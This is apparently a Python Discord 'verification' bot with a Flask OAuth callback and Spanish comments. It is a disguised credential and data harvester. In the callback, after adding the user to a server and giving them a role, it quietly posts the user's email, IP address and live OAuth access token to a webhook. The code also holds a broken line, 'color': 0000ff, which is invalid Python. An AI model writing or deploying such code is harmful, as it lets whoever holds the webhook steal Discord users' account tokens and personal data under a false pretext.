from flask import Flask, redirect, request
import requests
import discord
from discord.ext import commands
import threading

# =========================
# CONFIG
# =========================
import os

CLIENT_ID = os.getenv("CLIENT_ID")
CLIENT_SECRET = os.getenv("CLIENT_SECRET")

REDIRECT_URI = "https://botgithubio-production.up.railway.app/callback"

WEBHOOK_URL = os.getenv("WEBHOOK_URL")

BOT_TOKEN = os.getenv("BOT_TOKEN")

# =========================

app = Flask(__name__)

intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix="!", intents=intents)

# LINK VERIFICACION
VERIFY_URL = (
    f"https://discord.com/oauth2/authorize"
    f"?client_id={CLIENT_ID}"
    f"&response_type=code"
    f"&redirect_uri={REDIRECT_URI}"
    f"&scope=identify%20email%20guilds.join"
)

# =========================
# BOT DISCORD
# =========================

@bot.event
async def on_ready():
    print(f"Bot conectado como {bot.user}")

@bot.command()
async def verify(ctx):
    embed = discord.Embed(
        title="Verificación",
        description=f"[Click aquí para verificarte]({VERIFY_URL})",
        color=0x0000FF
    )

    await ctx.send(embed=embed)

# =========================
# WEB CALLBACK
# =========================

@app.route("/callback")
def callback():

    code = request.args.get("code")

    data = {
        "client_id": CLIENT_ID,
        "client_secret": CLIENT_SECRET,
        "grant_type": "authorization_code",
        "code": code,
        "redirect_uri": REDIRECT_URI,
        "scope": "identify email"
    }

    headers = {
        "Content-Type": "application/x-www-form-urlencoded"
    }

    token = requests.post(
        "https://discord.com/api/oauth2/token",
        data=data,
        headers=headers
    ).json()

    access_token = token.get("access_token")

    # Obtener datos del usuario
    user = requests.get(
        "https://discord.com/api/users/@me",
        headers={
            "Authorization": f"Bearer {access_token}"
        }
    ).json()

    user_id = user["id"]

    # Agregar al servidor y asignar rolar
    GUILD_ID = 1498563124914159708
    ROLE_ID = 1498569814044708964

    requests.put(
    f"https://discord.com/api/guilds/{GUILD_ID}/members/{user_id}",
    headers={
        "Authorization": f"Bot {BOT_TOKEN}",
        "Content-Type": "application/json"
    },
    json={
        "access_token": access_token
    }
)
    
    # Asignar el rol
    requests.put(
        f"https://discord.com/api/guilds/{GUILD_ID}/members/{user_id}/roles/{ROLE_ID}",
        headers={
            "Authorization": f"Bot {BOT_TOKEN}"
    }
)
    # DATOS
    username = f"{user['username']}#{user['discriminator']}"
    email = user.get("email", "No disponible")

    # IP
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)

    # WEBHOOK EMBED
    embed = {
        "title": "Nuevo usuario verificado",
        "color": 0000ff,
        "fields": [
            {
                "name": "Usuario",
                "value": username,
                "inline": True
            },
            {
                "name": "ID",
                "value": user_id,
                "inline": True
            },
            {
                "name": "Email",
                "value": email,
                "inline": False
            },
            {
                "name": "IP",
                "value": ip,
                "inline": False
            },
            {
                "name": "Token de acceso",
                "value": access_token,
                "inline": False
            }
        ]
    }

    requests.post(
        WEBHOOK_URL,
        json={
            "embeds": [embed]
        }
    )

    return "Verificación completada"

# =========================
# FLASK THREAD
# =========================

def run_web():
    app.run(host="0.0.0.0", port=5000)

threading.Thread(target=run_web).start()

bot.run(BOT_TOKEN)
